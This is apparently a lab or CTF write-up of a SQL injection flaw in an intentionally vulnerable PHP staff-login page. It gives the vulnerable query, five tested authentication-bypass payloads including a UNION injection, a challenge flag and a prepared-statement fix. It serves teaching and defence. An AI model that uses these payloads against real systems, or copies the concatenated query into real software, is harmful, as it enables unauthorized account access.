# SQL Injection — Staff Login (Assignment Write-up)

**Target:** `admin/login.php` → `admin/check_login.php`
**Vulnerability type:** SQL Injection (CWE-89) — Authentication Bypass
**Root cause:** user-supplied `username` / `password` are concatenated directly into
the SQL string instead of being sent as bound parameters:

```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$stmt  = $pdo->query($query);
```

Because the input is never escaped or parameterized, any quote characters,
`OR` clauses, `UNION SELECT`s or `--` comments typed into the form become
part of the SQL the database actually executes.

## How to run it
```
php -S localhost:8000
```
Then open `http://localhost:8000/admin/login.php`.
(Requires PHP with the `sqlite3` / `pdo_sqlite` extension — a fresh
`database.sqlite` with 3 seed users is created automatically on first run.)

## Seed accounts (for comparison — don't need these to break in)
| username | password      | role  |
|----------|---------------|-------|
| admin    | DreamHouse@2026 | admin |
| daniyal  | khayaban123   | staff |
| kaneez   | clifton456    | staff |

## 5 working payloads (all tested)

| # | Username field | Password field | Technique |
|---|-----------------|-----------------|-----------|
| 1 | `admin'-- ` | *(anything)* | **Comment-based bypass.** `'--` closes the username string and comments out the rest of the query, so the password check never runs. |
| 2 | `' OR '1'='1` | `' OR '1'='1` | **Classic tautology.** Turns the WHERE clause into an always-true condition on both fields. |
| 3 | `' OR 1=1 -- ` | `x` | **OR 1=1 with trailing comment.** Same idea as #2, using a numeric tautology and a comment instead of closing the password clause manually. |
| 4 | `nobody' UNION SELECT 99,'hacker','x',1,'Injected User' -- ` | `x` | **UNION-based injection.** Ignores the real `users` row entirely and fabricates a fake row (with `is_admin = 1`) that the application happily logs in as. |
| 5 | `admin` | `x' OR '1'='1` | **Password-field bypass.** Shows the injection doesn't have to be in the username — the password field alone is enough to make the condition always true. |

Every payload above lands on `dashboard.php` as the **admin** account (or a
fabricated one) without ever knowing the real password, and reveals:

```
PicoCTF{sql1_4uth_byp4ss_1s_r34l}
```

## The fix
Replace the vulnerable query with a parameterized/prepared statement:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :u AND password = :p");
$stmt->execute(['u' => $username, 'p' => $password]);
$result = $stmt->fetch(PDO::FETCH_ASSOC);
```

With bound parameters, user input is sent to SQLite **separately** from the
query text, so it can only ever be treated as data — never as part of the
SQL structure. (Passwords should also be hashed with `password_hash()` /
verified with `password_verify()` rather than stored in plain text — a
second, related weakness this demo intentionally keeps simple for clarity.)
